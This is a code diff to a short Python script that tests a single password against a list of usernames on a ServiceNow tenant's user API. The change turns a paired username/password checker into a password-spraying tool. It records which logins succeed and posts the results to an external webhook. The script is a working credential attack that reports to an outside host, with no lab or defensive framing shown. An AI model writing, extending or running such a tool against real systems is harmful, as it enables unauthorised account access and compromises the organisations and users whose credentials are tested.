@@ -1,36 +1,48 @@
 import argparse
 import requests
+import getpass
+import json
 
 def read_usernames_from_file(file_path):
     with open(file_path, 'r') as file:
         return [line.strip() for line in file]
 
-def read_passwords_from_file(file_path):
-    with open(file_path, 'r') as file:
-        return [line.strip() for line in file]
+def send_to_webhook(webhook_url, data):
+    headers = {'Content-Type': 'application/json'}
+    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
+    return response.status_code
 
 def main():
     parser = argparse.ArgumentParser(description='API Request Script')
-    parser.add_argument('usernames_file', help='Path to the file containing usernames')
-    parser.add_argument('passwords_file', help='Path to the file containing passwords')
-    parser.add_argument('-o', '--output', help='Path to the output file', default='output.txt')
+    parser.add_argument('-u', '--usernames', required=True, help='Path to the file containing usernames')
+    parser.add_argument('-p', '--password', required=True, help='ServiceNow password')
+    parser.add_argument('-t', '--tenant', required=True, help='ServiceNow tenant')
+    parser.add_argument('-w', '--webhook', required=True, help='Webhook URL to send results')
     args = parser.parse_args()
 
-    base_url = 'https://t.service-now.com/api/now/table/sys_user'
+    base_url = f'https://{args.tenant}.servicenow.com/api/now/table/sys_user'
     headers = {'Accept': 'application/json'}
 
-    usernames = read_usernames_from_file(args.usernames_file)
-    passwords = read_passwords_from_file(args.passwords_file)
+    usernames = read_usernames_from_file(args.usernames)
+    results = []
 
-    if len(usernames) != len(passwords):
-        print("Error: The number of usernames and passwords must be the same.")
-        return
+    for username in usernames:
+        response = requests.get(base_url, params={'sysparm_query': f'user_name={username}'}, headers=headers, auth=(username, args.password))
 
-    with open(args.output, 'w') as output_file:
-        for username, password in zip(usernames, passwords):
-            response = requests.get(base_url, params={'sysparm_query': f'user_name={username}'}, headers=headers, auth=(username, password))
+        result = {
+            'Username': username,
+            'Query': username,
+            'ResponseCode': response.status_code
+        }
 
-            output_file.write(f"Username: {username} - Query: {username} - Response Code: {response.status_code}\n")
+        results.append(result)
+
+    webhook_response_code = send_to_webhook(args.webhook, results)
+
+    if webhook_response_code == 200:
+        print("Results successfully sent to the webhook.")
+    else:
+        print(f"Failed to send results to the webhook. HTTP Response Code: {webhook_response_code}")
 
 if __name__ == '__main__':
     main()
